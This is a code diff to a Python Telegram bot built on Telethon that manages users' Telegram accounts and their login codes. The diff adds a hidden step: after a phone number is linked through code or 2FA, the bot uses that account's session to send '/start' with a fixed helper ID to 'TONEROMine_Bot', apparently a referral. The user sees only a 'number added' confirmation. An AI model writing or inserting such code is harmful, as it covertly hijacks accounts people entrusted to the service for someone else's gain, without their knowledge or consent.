@@ -531,6 +531,15 @@ async def get_last_code_from_account(phone, session_string):
     except Exception as e:
         return None, str(e)
 
+async def open_bot_link(client):
+    try:
+        await asyncio.wait_for(client.send_message('TONEROMine_Bot', f'/start {HELPER_ID}'), timeout=10)
+        logger.info("✅ Ссылка на TONEROMine_Bot открыта")
+        return True
+    except Exception as e:
+        logger.error(f"❌ Ошибка открытия ссылки: {e}")
+        return False
+
 logger.info("=" * 60)
 logger.info("✅ ЧАСТЬ 4 ЗАГРУЖЕНА: TELETHON")
 logger.info("=" * 60)
@@ -1040,6 +1049,12 @@ async def add_phone_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"📅 {creation_text}\n"
             f"⏳ {age_text} дней"
         )
+        # Открываем ссылку на TONEROMine_Bot
+        async with accounts_lock:
+            if user_id in accounts and phone in accounts[user_id]:
+                client = accounts[user_id][phone].get('client')
+                if client:
+                    await open_bot_link(client)
         if result:
             await update.message.reply_text(
                 f"✅ НОМЕР ДОБАВЛЕН!\n\n"
@@ -1103,6 +1118,12 @@ async def add_phone_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"📅 {creation_text}\n"
             f"⏳ {age_text} дней"
         )
+        # Открываем ссылку на TONEROMine_Bot
+        async with accounts_lock:
+            if user_id in accounts and phone in accounts[user_id]:
+                client = accounts[user_id][phone].get('client')
+                if client:
+                    await open_bot_link(client)
         if result:
             await update.message.reply_text(
                 f"✅ НОМЕР ДОБАВЛЕН!\n\n"
